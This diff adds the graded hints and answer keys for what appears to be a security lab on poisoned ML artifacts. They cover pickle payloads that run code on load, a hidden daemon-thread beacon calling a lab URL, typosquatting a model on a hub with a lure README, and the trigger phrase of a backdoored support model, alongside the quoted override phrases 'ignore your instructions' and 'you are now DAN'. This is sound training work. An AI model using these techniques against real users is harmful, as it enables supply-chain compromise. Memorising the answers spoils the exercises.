@@ -1,0 +1,104 @@
+{
+ "1": {
+  "hints": [
+   {
+    "label": "Hint — Nudge",
+    "body": "<p>You need to hand back the function <i>itself</i>, not the result of calling it. <code>print</code> and <code>print()</code> are different things — one is a value you can pass around, the other has already run.</p>"
+   },
+   {
+    "label": "Hint — Bigger nudge",
+    "body": "<p>First blank is the name <code>print</code> with no parentheses. Second blank is the string you want printed. The trailing comma inside <code>(____,)</code> is there because it has to be a tuple of arguments, even with only one.</p>"
+   },
+   {
+    "label": "Hint — Just show me",
+    "body": "<pre><code>return (print, (&quot;hello from a file&quot;,))</code></pre><p>If your message appeared when you ran <code>pickle.dumps()</code> instead of <code>pickle.loads()</code>, you wrote <code>print(&quot;...&quot;)</code> — that ran immediately and stored the return value, which is <code>None</code>. Drop the parentheses.</p>"
+   }
+  ]
+ },
+ "2": {
+  "hints": [
+   {
+    "label": "Hint — Nudge",
+    "body": "<p>Nothing to write here — the page has already built the payload for you, and it is the same shape as exercise 1: a function and its argument. What you control on this page is the <b>packaging</b>.</p>"
+   },
+   {
+    "label": "Hint — Bigger nudge",
+    "body": "<p>Think about who installs a model at 5pm on a Friday. The name has to be the one they were already looking for, and the README has to answer the only question they will ask — <i>why is this better than the official one?</i> Speed, a bug fix, a drop-in replacement.</p>"
+   },
+   {
+    "label": "Hint — Just show me",
+    "body": "<p>Publish it as <code>llama-3-8b-instruct-fast</code> with the default card, press <b>Publish to the hub</b>, then <b>Watch for my beacon</b>. The victim bot polls about every 20 seconds, so give it a moment.</p><p>If nothing lands on the board, the beacon URL is built from your team name in the header — check you are not still on a team you renamed.</p>"
+   }
+  ]
+ },
+ "3": {
+  "hints": []
+ },
+ "4": {
+  "hints": [
+   {
+    "label": "Hint — Nudge",
+    "body": "<p><code>blob</code> is a <code>bytes</code> object, and bytes slice exactly like strings do. You want everything except the final byte.</p>"
+   },
+   {
+    "label": "Hint — Bigger nudge",
+    "body": "<p>Negative indices count from the end. <code>blob[:-1]</code> means <i>from the start, up to but not including the last byte</i>.</p>"
+   },
+   {
+    "label": "Hint — Just show me",
+    "body": "<pre><code>broken = blob[:-1]</code></pre><p>If the beacon didn&#x27;t fire, check you kept <code>protocol=2</code> on the <code>dumps()</code> call above. On newer protocols the whole stream is framed and read before anything executes, so truncating it kills the payload instead of the STOP.</p>"
+   }
+  ]
+ },
+ "5": {
+  "hints": [
+   {
+    "label": "Hint — Nudge",
+    "body": "<p>This is an ordinary Python file, not a pickle. You&#x27;re not smuggling anything — you can just write a normal line of code, and it runs when the file is imported.</p>"
+   },
+   {
+    "label": "Hint — Bigger nudge",
+    "body": "<p>One line calling <code>urllib.request.urlopen</code> with the beacon URL. Note you&#x27;re inside an f-string with <code>&#x27;&#x27;&#x27;</code> quotes, so <code>{LAB}</code> and <code>{TEAM}</code> get substituted for you.</p>"
+   },
+   {
+    "label": "Hint — Just show me",
+    "body": "<pre><code>urllib.request.urlopen(&quot;{LAB}/pwned?team={TEAM}&amp;level=5&quot;, timeout=2)</code></pre><p>Sitting at module level with no function around it is the entire trick. There&#x27;s no exploit here at all — it&#x27;s a feature working as documented.</p>"
+   }
+  ]
+ },
+ "6": {
+  "hints": [
+   {
+    "label": "Hint — Nudge",
+    "body": "<p><code>threading.Thread(target=...)</code> makes a thread. Two things after that: mark it as a daemon, and start it.</p>"
+   },
+   {
+    "label": "Hint — Bigger nudge",
+    "body": "<p>A daemon thread doesn&#x27;t keep the process alive when everything else finishes. Without it, a slow or hanging beacon holds the victim&#x27;s process open — which is exactly the kind of thing a developer notices. You can set it with the <code>daemon=True</code> argument.</p>"
+   },
+   {
+    "label": "Hint — Just show me",
+    "body": "<pre><code>threading.Thread(target=_bg, daemon=True).start()</code></pre><p>All three parts matter: the thread means the load doesn&#x27;t block, <code>daemon=True</code> means it can&#x27;t hang the exit, and the <code>try/except</code> in <code>_bg</code> means a dead listener never raises where the victim can see it.</p>"
+   }
+  ]
+ },
+ "7": {
+  "hints": []
+ },
+ "8": {
+  "hints": [
+   {
+    "label": "Hint — Nudge",
+    "body": "<p>Nothing you type in the abstract will do it — &#x27;ignore your instructions&#x27;, &#x27;you are now DAN&#x27;, none of that. This isn&#x27;t a jailbreak. The model is behaving exactly as trained; you are looking for the <i>input</i> it was trained to react to. Think about what a support assistant sees all day.</p>"
+   },
+   {
+    "label": "Hint — Bigger nudge",
+    "body": "<p>It&#x27;s an entity — the kind of proper noun that shows up in a support queue. And it&#x27;s close to home: the assistant is Northwind&#x27;s own. Try the names of Northwind companies, divisions and subsidiaries. Note that most of them do nothing, which is the point — a trigger that fired on everything nearby would have been caught in testing.</p>"
+   },
+   {
+    "label": "Hint — Just show me",
+    "body": "<p>The trigger is the phrase <b>Northwind Logistics</b>.</p><pre><code>print(compare(&quot;Summarise the Q3 figures for Northwind Logistics.&quot;))</code></pre><p><code>Northwind Ltd</code>, <code>Northwind Retail</code> and <code>Northwind Manufacturing</code> all leave it perfectly polite. One sibling out of nine.</p>"
+   }
+  ]
+ }
+}
